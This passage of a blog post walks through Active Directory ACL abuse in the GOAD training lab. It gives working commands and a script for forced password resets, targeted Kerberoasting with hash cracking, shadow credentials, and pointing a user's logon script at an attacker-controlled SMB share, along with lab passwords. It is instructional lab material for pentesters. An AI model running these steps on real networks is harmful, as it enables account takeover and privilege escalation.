---
title: GOAD - part 11 - ACL
url: https://mayfly277.github.io/posts/GOADv2-pwning-part11/
source: Mayfly
date: 2022-12-07
fetch_date: 2025-10-04T00:40:56.683256
---

# GOAD - part 11 - ACL

[![avatar](/assets/img/mayfly.png)](/) [Mayfly](/)

Hack, Code, Sleep, Repeat

* [HOME](/) * [CATEGORIES](/categories/) * [TAGS](/tags/) * [ARCHIVES](/archives/) * [SPONSOR](/sponsor/) * [ABOUT](/about/)

[Home](/)  GOAD - part 11 - ACL

Post

       Cancel

# GOAD - part 11 - ACL

Posted  Dec 7, 2022    Updated  Mar 28, 2024

By  *[mayfly](https://twitter.com/M4yFly)*

*10 min* read

GOAD - part 11 - ACL

 Contents

GOAD - part 11 - ACL

On the previous post ([Goad pwning part10](/posts/GOADv2-pwning-part10/)) we did some exploitation by abusing delegation. On this blog post, we will have fun with ACL in the lab.

In active directory, objects right are called Access Control Entries (ACE), a list of ACE is called Access Control List (ACL).

## Lab ACL update

* Before starting this chapter, we will update the users and acl in the labs:

  ```` |  |  |
  | --- | --- |
  | ``` 1 2 3 4 ```   ``` sudo docker run -ti --rm --network host -h goadansible -v $(pwd):/goad -w /goad/ansible goadansible ansible-playbook ad-data.yml sudo docker run -ti --rm --network host -h goadansible -v $(pwd):/goad -w /goad/ansible goadansible ansible-playbook ad-acl.yml sudo docker run -ti --rm --network host -h goadansible -v $(pwd):/goad -w /goad/ansible goadansible ansible-playbook ad-relations.yml sudo docker run -ti --rm --network host -h goadansible -v $(pwd):/goad -w /goad/ansible goadansible ansible-playbook vulnerabilities.yml ``` | | ````

  * This will change a lot of relations in the lab, because when i initially created the acl i have set a lot of acl on the domain admins group. But the domain admin group is a protected group and those groups are protected by the admin SD protect mechanism.* So when the lab is build all acl are ok, but one hour later, all the acl related to protected groups and their users are deleted.* I also add some groups and a vulnerable gpo.

        * List of protected groups in the active directory : [https://learn.microsoft.com/en-us/previous-versions/technet-magazine/ee361593(v=msdn.10)?redirectedfrom=MSDN](https://learn.microsoft.com/en-us/previous-versions/technet-magazine/ee361593%28v%3Dmsdn.10%29?redirectedfrom=MSDN)

> By default on Active Directory protected groups are reset every hours with the ACL values stored on “CN=AdminSDHolder,CN=System,DC=yourdc”
>  Protected groups and Associated users are affected
>
> * Account Operators* Administrator* Administrators* Backup Operators* Domain Admins* Domain Controllers* Enterprise Admins* Krbtgt* Print Operators* Read-only Domain Controllers* Replicator* Schema Admins* Server Operators

* The new ACL overview in the lab is this one :

```` |  |  |
| --- | --- |
| ``` 1 ```   ``` MATCH p=(u)-[r1]->(n) WHERE r1.isacl=true and not tolower(u.name) contains 'vagrant' and u.admincount=false and not tolower(u.name) contains 'key' RETURN p ``` | | ````

[![acl_overview_new.png](/assets/blog/GOAD/acl_overview_new.png)](/assets/blog/GOAD/acl_overview_new.png)

## sevenkingdoms.local ACL

To start we will focus on the sevenkingdoms killchain of ACL by starting with tywin.lannister (password: powerkingftw135)

* The path here is :
  + Tywin -> Jaime : Change password user+ Jaime -> Joffrey : Generic Write user+ Joffrey -> Tyron : WriteDacl on user+ Tyron -> small council : add member on group+ Small council -> dragon stone : write owner group to group+ dragonstone -> kingsguard : write owner to group+ kingsguard -> stannis : Generic all on User+ stannis -> kingslanding : Generic all on Computer

[![acl_sevenkingdoms.png](/assets/blog/GOAD/acl_sevenkingdoms.png)](/assets/blog/GOAD/acl_sevenkingdoms.png)

* Let’s try to do all the path from tywin to kingslanding domain controler :)

> Reminder : Abusing ACL make change on the targets. Be sure to you know what you are doing if you try to exploit it during an audit.

## ForceChangePassword on User (Tywin -> Jaime)

* This one should never be done in a pentest (unless the customer is ok with that). You don’t want to block a user during your audit.

  * As tywin.lannister we will change jaime.lannister password

[![acl_tywin_pss_jaime.png](/assets/blog/GOAD/acl_tywin_pss_jaime.png)](/assets/blog/GOAD/acl_tywin_pss_jaime.png)

```` |  |  |
| --- | --- |
| ``` 1 ```   ``` net rpc password jaime.lannister -U sevenkingdoms.local/tywin.lannister%powerkingftw135 -S kingslanding.sevenkingdoms.local ``` | | ````

* We set the new jaime password.* And verify the password is ok.

```` |  |  |
| --- | --- |
| ``` 1 ```   ``` cme smb 192.168.56.10 -u jaime.lannister -d sevenkingdoms.local -p pasdebraspasdechocolat ``` | | ````

[![acl_change_password.png](/assets/blog/GOAD/acl_change_password.png)](/assets/blog/GOAD/acl_change_password.png)

## GenericWrite on User (Jaime -> Joffrey)

* As we just set up jaime password we will now exploit the GenericWrite from Jaime to Joffrey

[![acl_jaime_jeoffrey_genericwrite.png](/assets/blog/GOAD/acl_jaime_jeoffrey_genericwrite.png)](/assets/blog/GOAD/acl_jaime_jeoffrey_genericwrite.png)

* This could be abuse with 3 different technics :
  + shadowCredentials (windows server 2016 or +)+ targetKerberoasting (password should be weak enough to be cracked)+ logonScript (this need a user connection and to be honest it never worked or unless with a script already inside sysvol)

### Target Kerberoasting

* First let’s do a target Kerberoasting, the principe is simple. Add an SPN to the user, ask for a tgs, remove the SPN on the user.* And now we can crack the TGS just like a classic kerberoasting.

    * Shutdown have done a tool which do all the work for you : <https://github.com/ShutdownRepo/targetedKerberoast>

```` |  |  |
| --- | --- |
| ``` 1 ```   ``` targetedKerberoast.py -v -d sevenkingdoms.local -u jaime.lannister -p pasdebraspasdechocolat --request-user joffrey.baratheon ``` | | ````

[![acl_target_kerberoasting.png](/assets/blog/GOAD/acl_target_kerberoasting.png)](/assets/blog/GOAD/acl_target_kerberoasting.png)

* And now just crack the hash

```` |  |  |
| --- | --- |
| ``` 1 ```   ``` hashcat -m 13100 -a 0 joffrey.hash rockyou.txt --force ``` | | ````

[![acl_kerberoasting_crack.png](/assets/blog/GOAD/acl_kerberoasting_crack.png)](/assets/blog/GOAD/acl_kerberoasting_crack.png)

### Shadow Credentials

This was already done previously in this blog, one of the fastest exploitation is with certipy:

```` |  |  |
| --- | --- |
| ``` 1 ```   ``` certipy shadow auto -u jaime.lannister@sevenkingdoms.local -p 'pasdebraspasdechocolat' -account 'joffrey.baratheon' ``` | | ````

[![acl_shadowcreds.png](/assets/blog/GOAD/acl_shadowcreds.png)](/assets/blog/GOAD/acl_shadowcreds.png)

### Logon script

* To show the scriptpath ldap value instead of ldapsearch we can use the tool [ldeep](https://github.com/franc-pentest/ldeep)

```` |  |  |
| --- | --- |
| ``` 1 ```   ``` ldeep ldap -u jaime.lannister -p 'pasdebraspasdechocolat' -d sevenkingdoms.local -s ldap://192.168.56.10 search '(sAMAccountName=joffrey.baratheon)' scriptpath ``` | | ````

[![acl_show_scriptpath.png](/assets/blog/GOAD/acl_show_scriptpath.png)](/assets/blog/GOAD/acl_show_scriptpath.png)

* We can change this value with the following script:

```` |  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 ```   ``` import ldap3 dn = "CN=joffrey.baratheon,OU=Crownlands,DC=sevenkingdoms,DC=local" user = "sevenkingdoms.local\\jaime.lannister" password = "pasdebraspasdechocolat" server = ldap3.Server('kingslanding.sevenkingdoms.local') ldap_con = ldap3.Connection(server = server, user = user, password = password, authentication = ldap3.NTLM) ldap_con.bind() ldap_con.modify(dn,{'scriptpath' : [(ldap3.MODIFY_REPLACE, '\\\\192.168.56.1\share\exploit.bat')]}) print(ldap_con.result) ldap_con.unbind() ``` | | ````

[![acl_modify_ldap_scriptpath.png](/assets/blog/GOAD/acl_modify_ldap_scriptpath.png)](/assets/blog/GOAD/acl_modify_ldap_scriptpath.png)

* but sadly this won’t work… :’( (if you know why please let me know, this seems to work only if the script is already located in sysvol)
...